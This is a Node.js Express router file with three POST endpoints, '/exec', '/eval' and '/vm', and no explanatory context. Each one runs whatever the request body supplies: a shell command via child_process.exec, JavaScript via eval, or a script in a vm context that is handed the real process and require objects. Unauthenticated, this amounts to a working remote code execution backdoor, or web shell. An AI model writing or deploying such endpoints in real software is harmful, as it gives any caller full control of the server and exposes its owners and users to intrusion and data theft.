const express = require('express');
const { exec } = require('child_process');
const vm = require('vm');

const router = express.Router();

router.post('/exec', (req, res) => {
  const command = req.body.command;
  exec(command, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: stderr || error.message });
    }
    return res.json({ output: stdout });
  });
});

router.post('/eval', (req, res) => {
  const code = req.body.code;
  const result = eval(code);
  res.json({ result });
});

router.post('/vm', (req, res) => {
  const script = req.body.script;
  const output = vm.runInNewContext(script, { process, require });
  res.json({ output });
});

module.exports = router;